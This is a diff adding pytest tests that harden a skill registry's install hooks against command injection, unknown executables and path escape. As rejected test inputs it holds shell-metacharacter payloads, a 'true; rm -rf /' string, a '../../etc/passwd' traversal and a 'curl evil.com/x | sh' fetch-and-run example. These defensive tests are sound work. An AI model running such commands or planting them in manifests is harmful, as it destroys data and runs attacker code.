@@ -650,13 +650,175 @@ class TestInstallSkill:
         assert (registry / "renamed" / "skill.yaml").exists()
 
     def test_install_hook_runs(self, tmp_path: Path, registry: Path):
+        """A relative script inside the skill dir is the supported path for
+        non-trivial install hooks now that ``shell=True`` is gone (FX.1.6).
+        """
         registry.mkdir(parents=True)
         src = _make_complete_skill(
             tmp_path / "src", "hook-install",
-            hooks={"install": "touch installed.marker", "validate": "", "enumerate": ""},
+            hooks={"install": "./install.sh", "validate": "", "enumerate": ""},
         )
+        script = src / "install.sh"
+        script.write_text("#!/bin/sh\ntouch installed.marker\n")
+        script.chmod(0o755)
         install_skill(src, skills_dir=registry)
         assert (registry / "hook-install" / "installed.marker").exists()
+
+
+class TestInstallHookHardening:
+    """Lock the FX.1.6 contract: install_cmd is allowlist + shell=False.
+
+    Threat model: ``skill.yaml`` is author-controlled and copied into the
+    registry verbatim by ``install_skill``. Pre-FX.1.6 the install hook
+    ran with ``shell=True``, so any author-injected metacharacter was RCE
+    on the registry host (audit B4, same family as FX.1.5 validate hook).
+    Unlike validate_skill, install_skill swallows hook errors and only
+    logs warnings — the contract here is "rejection is silent but
+    side-effects do NOT happen", so we assert via caplog + filesystem.
+    """
+
+    @pytest.mark.parametrize(
+        "metachar_cmd",
+        [
+            "true; touch pwned.marker",   # ;
+            "true | tee out",              # |
+            "true && touch pwned.marker",  # &
+            "true > pwned.marker",         # >
+            "echo $(id)",                  # $ + ()
+            "echo `id`",                   # backtick
+            "true < /etc/passwd",          # <
+            "true\ntouch pwned.marker",    # newline
+        ],
+    )
+    def test_metachar_rejected(
+        self, tmp_path: Path, registry: Path, caplog, metachar_cmd: str,
+    ):
+        registry.mkdir(parents=True)
+        src = _make_complete_skill(
+            tmp_path / "src", "metachar-install",
+            hooks={"install": metachar_cmd, "validate": "", "enumerate": ""},
+        )
+        with caplog.at_level("WARNING", logger="backend.skill_registry"):
+            install_skill(src, skills_dir=registry)
+        # Side effect must not have happened (no shell metas were honoured).
+        assert not (registry / "metachar-install" / "pwned.marker").exists()
+        # Helper rejection must be logged so operators can audit.
+        assert any(
+            "install hook" in rec.message and "rejected" in rec.message
+            and "shell metacharacter" in rec.message
+            for rec in caplog.records
+        ), [rec.message for rec in caplog.records]
+
+    def test_executable_not_in_allowlist_rejected(
+        self, tmp_path: Path, registry: Path, caplog,
+    ):
+        """`/usr/bin/curl evil.com/x | sh` is a classic supply-chain bootstrap;
+        even without the pipe, a bare absolute path outside the allowlist must
+        be refused so attackers cannot reach for OS binaries unknown to us."""
+        registry.mkdir(parents=True)
+        src = _make_complete_skill(
+            tmp_path / "src", "evil-install",
+            hooks={"install": "/usr/bin/curl evil.example", "validate": "", "enumerate": ""},
+        )
+        with caplog.at_level("WARNING", logger="backend.skill_registry"):
+            install_skill(src, skills_dir=registry)
+        assert any(
+            "install hook" in rec.message and "rejected" in rec.message
+            and "not in allowlist" in rec.message
+            for rec in caplog.records
+        ), [rec.message for rec in caplog.records]
+
+    def test_bare_unknown_executable_rejected(
+        self, tmp_path: Path, registry: Path, caplog,
+    ):
+        registry.mkdir(parents=True)
+        src = _make_complete_skill(
+            tmp_path / "src", "unknown-install",
+            hooks={"install": "rmtree --everything", "validate": "", "enumerate": ""},
+        )
+        with caplog.at_level("WARNING", logger="backend.skill_registry"):
+            install_skill(src, skills_dir=registry)
+        assert any(
+            "install hook" in rec.message and "rejected" in rec.message
+            and "not in allowlist" in rec.message
+            for rec in caplog.records
+        ), [rec.message for rec in caplog.records]
+
+    def test_relative_script_inside_skill_dir_allowed(
+        self, tmp_path: Path, registry: Path,
+    ):
+        """The escape valve for non-trivial install: ship `./install.sh`."""
+        registry.mkdir(parents=True)
+        src = _make_complete_skill(
+            tmp_path / "src", "relpath-install",
+            hooks={"install": "./install.sh", "validate": "", "enumerate": ""},
+        )
+        script = src / "install.sh"
+        script.write_text("#!/bin/sh\ntouch ran.marker\n")
+        script.chmod(0o755)
+        install_skill(src, skills_dir=registry)
+        assert (registry / "relpath-install" / "ran.marker").exists()
+
+    def test_relative_path_escape_rejected(
+        self, tmp_path: Path, registry: Path, caplog,
+    ):
+        registry.mkdir(parents=True)
+        src = _make_complete_skill(
+            tmp_path / "src", "escape-install",
+            hooks={"install": "../../etc/passwd", "validate": "", "enumerate": ""},
+        )
+        with caplog.at_level("WARNING", logger="backend.skill_registry"):
+            install_skill(src, skills_dir=registry)
+        assert any(
+            "install hook" in rec.message and "rejected" in rec.message
+            and ("escapes skill directory" in rec.message
+                 or "script not found" in rec.message)
+            for rec in caplog.records
+        ), [rec.message for rec in caplog.records]
+
+    def test_missing_relative_script_rejected(
+        self, tmp_path: Path, registry: Path, caplog,
+    ):
+        registry.mkdir(parents=True)
+        src = _make_complete_skill(
+            tmp_path / "src", "ghost-install",
+            hooks={"install": "./does_not_exist.sh", "validate": "", "enumerate": ""},
+        )
+        with caplog.at_level("WARNING", logger="backend.skill_registry"):
+            install_skill(src, skills_dir=registry)
+        assert any(
+            "install hook" in rec.message and "rejected" in rec.message
+            and "script not found" in rec.message
+            for rec in caplog.records
+        ), [rec.message for rec in caplog.records]
+
+    def test_python_invocation_allowed(
+        self, tmp_path: Path, registry: Path,
+    ):
+        registry.mkdir(parents=True)
+        src = _make_complete_skill(
+            tmp_path / "src", "py-install",
+            hooks={"install": "python3 --version", "validate": "", "enumerate": ""},
+        )
+        # No exception, no warning about rejection — the hook just exits 0.
+        info = install_skill(src, skills_dir=registry)
+        assert info.name == "py-install"
+
+    def test_install_directory_persists_after_hook_rejection(
+        self, tmp_path: Path, registry: Path,
+    ):
+        """A rejected install hook must NOT roll back the directory copy —
+        that matches the pre-FX.1.6 behaviour (CalledProcessError → warn-only,
+        skill stays installed). Operators can re-validate later or remove it
+        manually; silent rollback would surprise existing callers."""
+        registry.mkdir(parents=True)
+        src = _make_complete_skill(
+            tmp_path / "src", "rejected-install",
+            hooks={"install": "true; rm -rf /", "validate": "", "enumerate": ""},
+        )
+        info = install_skill(src, skills_dir=registry)
+        assert info.name == "rejected-install"
+        assert (registry / "rejected-install" / "skill.yaml").exists()
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
